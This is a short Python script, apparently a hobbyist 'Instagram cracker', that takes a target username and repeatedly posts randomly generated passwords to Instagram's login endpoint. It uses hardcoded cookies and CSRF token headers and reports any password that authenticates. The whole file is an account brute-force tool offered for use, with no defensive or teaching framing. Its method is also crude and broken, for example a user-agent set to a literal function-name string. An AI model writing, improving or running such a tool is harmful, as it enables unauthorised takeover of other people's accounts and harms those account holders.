import random
import requests
import pyfiglet
import time

print("\033[34;1m")

xs = pyfiglet.figlet_format("*insfah*")

print(xs)

print("\t\t\t\t\033[33;2m Developer : Fahdladn\n\t\t\t\t instagram : xsv_j\n\t\t\t\t Xtelegram : q2h_q")

print("\033[35;1m __________________________________________________________")

username = input("\033[32;2m\n[+] Enter the username : ")

while True:

    time.sleep(2)
		
    ex = '6','7','8','9','10','11','12','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26'  
		
    ix = "qwertyuiopasdfghjklzxcvbnm1234567890__..#@"
	
    rx = str("".join(random.choice(ex) for i in range(1)))
	
    password = "".join(random.choice(ix) for i in range(int(rx)))
	
    url = "https://www.instagram.com/accounts/login/ajax/"
	
    head = {
	    'accept':'*/*',
	    'accept-encoding':'gzip,deflate,br',
	    'accept-language':'en-US,en;q=0.9,ar;q=0.8',
	    'content-length':'269',
	    'content-type':'application/x-www-form-urlencoded',
	    'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
	    'origin':'https://www.instagram.com',
	    'referer':'https://www.instagram.com/',
	    'sec-fetch-dest':'empty',
	    'sec-fetch-mode':'cors',
	    'sec-fetch-site':'same-origin',
	    'user-agent': 'generate_user_agent()',
	    'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
	    'x-ig-app-id':'936619743392459',
	    'x-ig-www-claim':'0',
	    'x-instagram-ajax':'8a8118fa7d40',
	    'x-requested-with':'XMLHttpRequest'	
	}
    dat = {
	    'username': username,
	    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:11223344:{password}',
	    'queryParams': {},
	    'optIntoOneTap': 'false'
	}
	
    login = requests.post(url,headers=head,data=dat).text

    if '"authenticated":true,' in login:
        print(f"\n\033[33;2mPassword is true --- {password}")
        exit()

    elif '"status":"fail"' in login:
        print(f"\n\033[31;1mPassword is failed --- {password}")

    else:
        print(f"\n\033[31;1mPassword is failed --- {password}")